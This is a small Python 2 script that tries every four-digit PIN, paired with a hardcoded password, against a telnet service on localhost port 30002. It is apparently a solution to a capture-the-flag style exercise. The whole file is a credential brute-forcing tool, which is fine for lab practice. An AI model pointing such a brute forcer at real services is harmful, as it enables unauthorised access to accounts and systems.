import itertools
import telnetlib

BASE_PASSWORD = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
HOST = "localhost"

def getPossiblePins():
    pins = []

    for combination in itertools.product(xrange(10), repeat=4):
        pins.append(''.join(map(str, combination)))

    return pins

def beginDasBrute(pinList):
    for pin in pinList:
        tn = telnetlib.Telnet(HOST, '30002')
        tn.read_until('separated by a space.')
        tn.write("{0} {1} \r\n".format(BASE_PASSWORD, pin))
        print tn.read_until('again.')
        tn.close()

def main():
    pinList = getPossiblePins();
    beginDasBrute(pinList)


if __name__ == '__main__':
    main()